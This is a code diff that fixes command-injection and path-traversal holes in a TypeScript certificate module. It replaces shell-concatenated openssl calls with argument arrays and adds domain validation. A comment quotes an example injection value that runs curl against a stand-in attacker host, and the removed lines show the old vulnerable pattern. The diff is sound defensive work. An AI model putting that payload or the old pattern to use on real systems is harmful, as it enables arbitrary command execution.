@@ -212,57 +212,107 @@ export async function saveUploadedCert(
 
 /**
  * 从 PEM 证书内容中提取过期时间
- * 使用 openssl 命令解析（若可用），失败则返回 null
+ *
+ * 实现方式：调用 openssl x509 命令解析证书的 notAfter 字段。
+ *
+ * 安全修复（v1.2.0）：
+ *   旧实现使用 execSync 拼接 shell 命令，certPem 通过 replace(/"/g, '\\"') 转义双引号后拼入命令字符串，
+ *   但攻击者可在证书内容中注入反引号、$()、换行符等 shell 元字符绕过转义，执行任意命令。
+ *   现改为 execFileSync 参数数组方式传递，certPem 通过 stdin 输入，不经 shell 解析。
+ *
+ * @param certPem PEM 格式证书内容（含 -----BEGIN CERTIFICATE----- 头尾）
+ * @returns 成功返回 Date 对象，失败（openssl 不可用或解析失败）返回 null
  */
 function extractCertExpiry(certPem: string): Date | null {
   try {
-    // 安全修复：使用 execFileSync 避免命令注入（之前用 execSync 拼接 shell）
+    // 安全修复：使用 execFileSync 替代 execSync（避免 shell 拼接导致的命令注入）
     const { execFileSync } = require("child_process");
     const result = execFileSync(
       "openssl",
       ["x509", "-noout", "-enddate"],
       { input: certPem, encoding: "utf8", timeout: 5000 }
     ).trim();
-    // 输出形如: notAfter=Dec 31 23:59:59 2025 GMT
+    // openssl 输出格式：notAfter=Dec 31 23:59:59 2025 GMT
     const match = result.match(/notAfter=(.+)/);
     if (match) {
       const date = new Date(match[1]);
       if (!isNaN(date.getTime())) return date;
     }
   } catch {
-    // openssl 不可用或解析失败，忽略
+    // openssl 不可用或证书格式无法解析，返回 null 由调用方兜底处理
   }
   return null;
 }
 
 /**
  * 生成自签名证书（仅用于开发测试，浏览器会标记为不安全）
+ *
+ * 安全修复（v1.2.0 后补充）：
+ *   旧实现使用 execSync 拼接 shell 命令：
+ *     `openssl req ... -subj "/CN=${domain}"`
+ *   domain 参数来自数据库的 domains.domain_name 字段，未经校验直接拼接到 shell 字符串中，
+ *   存在命令注入风险。例如 domain = 'x";$(curl attacker.com);"' 可执行任意命令。
+ *   现改为使用 execFileSync 以参数数组方式调用 openssl，与 extractCertExpiry 的修复方式保持一致。
+ *   同时在入口处增加域名校验（与 saveUploadedCert 保持一致），双重保险。
+ *
+ * @param domain 目标域名（仅用于证书 CN 字段，不参与 shell 拼接）
+ * @returns { cert: PEM 证书内容, key: PEM 私钥内容 }
  */
 function generateSelfSignedCert(domain: string): { cert: string; key: string } {
-  // 使用 openssl 生成（如果可用）
+  // 安全修复：入口校验域名格式，防止路径遍历与 shell 元字符注入
+  // 与 saveUploadedCert 中的校验保持一致：仅允许字母、数字、点、减号
+  if (!domain || /[\/\\]/.test(domain) || domain.includes("..") || !/^[a-zA-Z0-9.-]+$/.test(domain)) {
+    throw new Error("域名格式非法，无法生成自签名证书");
+  }
+
+  // 优先使用 openssl 生成合法的 X.509 自签名证书（有效期 365 天）
   try {
-    const { execSync } = require("child_process");
-    const tmpDir = require("os").tmpdir();
+    // 安全修复：使用 execFileSync 替代 execSync
+    //   - execSync 通过 shell 执行命令字符串，存在元字符注入风险
+    //   - execFileSync 直接以 execve 方式调用，参数以数组传递，不经 shell 解析
+    const { execFileSync } = require("child_process");
+    const os = require("os");
+    const tmpDir = os.tmpdir();
+    // 使用 path.join 拼接临时文件路径（domain 已通过上面的格式校验，无路径遍历风险）
     const certTmp = path.join(tmpDir, `${domain}.crt`);
     const keyTmp = path.join(tmpDir, `${domain}.key`);
-    execSync(
-      `openssl req -x509 -newkey rsa:2048 -nodes -keyout "${keyTmp}" -out "${certTmp}" -days 365 -subj "/CN=${domain}" 2>/dev/null`
+    // 参数数组传递，避免 shell 拼接；stderr 重定向通过 stdio 选项控制
+    execFileSync(
+      "openssl",
+      [
+        "req", "-x509",
+        "-newkey", "rsa:2048",
+        "-nodes",                       // 不加密私钥
+        "-keyout", keyTmp,              // 私钥输出路径
+        "-out", certTmp,                // 证书输出路径
+        "-days", "365",                 // 有效期 365 天
+        "-subj", `/CN=${domain}`,       // 证书 Subject CN 字段
+      ],
+      { stdio: ["ignore", "ignore", "ignore"], timeout: 10000 }
     );
     const cert = fs.readFileSync(certTmp, "utf8");
     const key = fs.readFileSync(keyTmp, "utf8");
+    // 清理临时文件，避免遗留证书泄露
     fs.unlinkSync(certTmp);
     fs.unlinkSync(keyTmp);
     return { cert, key };
   } catch {
-    // openssl 不可用，回退到 crypto 模块生成（仅占位用，非合法 X.509）
+    // openssl 不可用或调用失败，回退到 Node.js crypto 模块生成
+    // 注意：此分支生成的证书不是合法的 X.509 证书，仅是 base64 编码的占位字符串
+    // 浏览器会拒绝该证书，仅供开发测试观察 UI 使用
     const crypto = require("crypto");
     const keyPair = crypto.generateKeyPairSync("rsa", {
       modulusLength: 2048,
       publicKeyEncoding: { type: "spki", format: "pem" },
       privateKeyEncoding: { type: "pkcs8", format: "pem" },
     });
+    // 构造一个伪 PEM（非合法 X.509，仅用于占位）
+    const certBody = Buffer.from(`Self-signed cert for ${domain}`)
+      .toString("base64")
+      .match(/.{1,64}/g)
+      ?.join("\n");
     const certPem = `-----BEGIN CERTIFICATE-----
-${Buffer.from(`Self-signed cert for ${domain}`).toString("base64").match(/.{1,64}/g)?.join("\n")}
+${certBody}
 -----END CERTIFICATE-----`;
     return { cert: certPem, key: keyPair.privateKey };
   }
@@ -459,8 +509,21 @@ export async function checkAndRenewExpiring() {
 
 /**
  * 获取指定域名的证书文件路径（若存在）
+ *
+ * 安全说明：
+ *   domain 参数仅用于拼接路径，已通过正则校验避免路径遍历。
+ *   校验规则与 saveUploadedCert 保持一致：仅允许字母、数字、点、减号。
+ *   若域名格式非法（含 / \ .. 等），直接返回 null，避免读取 CERT_DIR 之外的文件。
+ *
+ * @param domain 目标域名
+ * @returns 存在时返回 { certPath, keyPath }，不存在或域名非法时返回 null
  */
-export function getCertPaths(domain: string) {
+export function getCertPaths(domain: string): { certPath: string; keyPath: string } | null {
+  // 域名格式校验：防止 path.join 后路径越界（如 domain="../etc"）
+  if (!domain || /[\/\\]/.test(domain) || domain.includes("..") || !/^[a-zA-Z0-9.-]+$/.test(domain)) {
+    return null;
+  }
+
   const certPath = path.join(CERT_DIR, domain, "fullchain.pem");
   const keyPath = path.join(CERT_DIR, domain, "privkey.pem");
 
